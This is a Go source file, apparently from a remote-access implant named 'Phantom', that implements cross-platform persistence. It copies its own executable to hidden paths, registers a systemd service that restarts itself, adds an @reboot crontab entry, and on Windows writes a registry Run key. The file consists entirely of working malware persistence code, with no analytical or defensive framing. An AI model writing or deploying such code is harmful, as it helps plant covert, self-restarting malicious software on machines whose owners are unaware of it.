package main

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"runtime"
)

func persist() Result {
	exe, err := os.Executable()
	if err != nil {
		return Result{OK: false, Err: err.Error()}
	}
	if runtime.GOOS == "windows" {
		return persistWindows(exe)
	}

	root := os.Getuid() == 0
	var dst string
	if root {
		dst = "/usr/local/bin/.phantom"
	} else {
		home, _ := os.UserHomeDir()
		dst = filepath.Join(home, ".local", "bin", ".phantom")
		os.MkdirAll(filepath.Dir(dst), 0755)
	}
	if err := copyFile(exe, dst); err != nil {
		return Result{OK: false, Err: "copy: " + err.Error()}
	}
	os.Chmod(dst, 0755)

	if root {
		unit := fmt.Sprintf(`[Unit]
Description=Phantom agent
After=network-online.target

[Service]
ExecStart=%s
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
`, dst)
		if err := os.WriteFile("/etc/systemd/system/phantom.service", []byte(unit), 0644); err != nil {
			return Result{OK: false, Err: "unit: " + err.Error()}
		}
		newCmd("systemctl", "daemon-reload").Run()
		newCmd("systemctl", "enable", "--now", "phantom.service").Run()
		return Result{OK: true, Out: "systemd -> " + dst}
	}

	line := "@reboot " + dst + " >/dev/null 2>&1"
	out, err := newCmd("sh", "-c",
		fmt.Sprintf("(crontab -l 2>/dev/null | grep -v %s; echo '%s') | crontab -", dst, line),
	).CombinedOutput()
	if err != nil {
		return Result{OK: false, Out: string(out), Err: "cron: " + err.Error()}
	}
	return Result{OK: true, Out: "cron @reboot -> " + dst}
}

func persistWindows(exe string) Result {
	appdata := os.Getenv("APPDATA")
	if appdata == "" {
		appdata = os.TempDir()
	}
	dir := filepath.Join(appdata, "Phantom")
	os.MkdirAll(dir, 0755)
	dst := filepath.Join(dir, "phantom.exe")
	if err := copyFile(exe, dst); err != nil {
		return Result{OK: false, Err: err.Error()}
	}
	out, err := newCmd("reg", "add",
		`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
		"/v", "Phantom", "/t", "REG_SZ", "/d", dst, "/f").CombinedOutput()
	if err != nil {
		return Result{OK: false, Out: string(out), Err: err.Error()}
	}
	return Result{OK: true, Out: "registry Run key -> " + dst}
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	tmp := dst + ".new"
	out, err := os.OpenFile(tmp, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0755)
	if err != nil {
		return err
	}
	if _, err := io.Copy(out, in); err != nil {
		out.Close()
		return err
	}
	out.Close()
	return os.Rename(tmp, dst)
}